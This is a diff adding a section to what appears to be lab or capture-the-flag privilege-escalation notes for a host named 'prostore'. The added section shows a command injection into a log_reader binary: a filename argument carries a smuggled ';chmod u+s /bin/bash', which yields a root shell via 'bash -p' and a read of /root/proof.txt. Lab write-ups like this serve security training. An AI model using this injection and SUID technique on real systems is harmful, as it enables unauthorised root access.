@@ -2337,6 +2337,42 @@ sh-3.2# id
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 ````
+####  /usr/local/bin/log_reader
+````
+observer@prostore:~$ /usr/local/bin/log_reader 
+/usr/local/bin/log_reader 
+Usage: /usr/local/bin/log_reader filename.log
+````
+````
+observer@prostore:~$ /usr/local/bin/log_reader /var/log/auth.log
+/usr/local/bin/log_reader /var/log/auth.log
+Reading: /var/log/auth.log
+May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
+````
+##### Exploit
+````
+observer@prostore:~$ /usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
+</log_reader "/var/log/auth.log;chmod u+s /bin/bash"
+Reading: /var/log/auth.log;chmod u+s /bin/bash
+May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
+````
+````
+observer@prostore:~$ ls -la /bin/bash
+ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
+````
+````
+bash-5.1$ /bin/bash -p
+/bin/bash -p
+bash-5.1# id
+id
+uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)
+bash-5.1# cd /root
+cd /root
+bash-5.1# cat proof.txt
+cat proof.txt
+3a7df0bf25481b398003f325d6250ba7
+````
 #### /usr/bin/dosbox
 ````
 DOSBox version 0.74-3
